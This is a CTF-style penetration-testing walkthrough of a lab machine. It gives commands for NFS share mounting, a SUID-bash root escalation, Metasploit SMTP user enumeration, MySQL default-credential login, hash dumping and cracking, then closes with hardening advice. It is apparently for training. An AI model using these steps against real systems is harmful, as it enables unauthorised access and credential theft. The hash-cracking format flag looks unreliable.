# 🔓 PenTest Walkthrough — NFS, SMTP & MySQL Attack

> A step-by-step walkthrough exploiting a vulnerable machine using **NFS**, **SMTP**, and **MySQL** attack techniques. Perfect for CTF training, offensive security learning, or building a technical portfolio.

---

## 🔍 Nmap Discovery

We start by scanning the target machine:

```bash
nmap -sS -sV -O -Pn -p- 10.10.16.13
```

**Scan results:**

- 22/tcp — SSH (OpenSSH 7.6p1 Ubuntu)
- 111/tcp — RPCBind
- 2049/tcp — NFS v3-v4
- 33043/tcp — mountd
- 42457/tcp — nlockmgr
- 46645/tcp — mountd
- 56517/tcp — mountd

![Nmap Scan](images/image-20250503003559188.png)

---

## 📁 NFS Attack

NFS is exposed and exporting directories without authentication.

### 🔧 Mounting the NFS share:

```bash
showmount -e 10.10.16.13
sudo mount -t nfs 10.10.16.13:/home/user /mnt/nfs
```

![Mount NFS](images/image-20250503004653389.png)

---

### ⚙️ Privilege Escalation with SUID Bash

We copy a local Bash binary and apply root privileges using SUID:

```bash
cp ~/Downloads/bash /mnt/nfs
sudo chown root bash
sudo chmod +s bash
```

![Copy Bash](images/image-20250503195310704.png)

Then we get a root shell using:

```bash
./bash -p
```

![Root Shell](images/image-20250503202950261.png)

---

## ✉️ SMTP Enumeration

Using Metasploit to enumerate valid SMTP users.

### 🔎 Running smtp_enum module:

```bash
msfconsole
search smtp_enum
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 10.10.16.13
run
```

![SMTP Enum](images/image-20250504210311199.png)

---

## 🛢️ MySQL Access

Accessing MySQL with weak credentials:

```bash
mysql -h 10.10.16.13 -u root -p
# password: password
```

![MySQL Login](images/image-20250505001633560.png)

Querying version and dumping hashes:

```sql
SELECT @@version;
SELECT * FROM users;
```

![SQL Version](images/image-20250505001729704.png)

Extracted hash:

```
carl:*EA031893AA21444B170FC2162A56978B8CEECE18
```

---

## 🔐 Cracking Hash with John

1. Save the hash to a file:

```bash
echo "carl:*EA031893AA21444B170FC2162A56978B8CEECE18" > hash.txt
```

2. Run John the Ripper:

```bash
john hash.txt --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt
```

![John Running](images/image-20250505003744664.png)

---

## ✅ Conclusion

This target machine highlighted multiple common vulnerabilities:

- Unrestricted NFS → privilege escalation
- Exposed SMTP → user enumeration
- Weak MySQL credentials → credential dumping

---

### 🛡️ Hardening Recommendations:

- Restrict NFS exports by IP and UID
- Use firewall rules to limit internal services
- Disable unnecessary SMTP accounts
- Enforce strong MySQL credentials and host binding
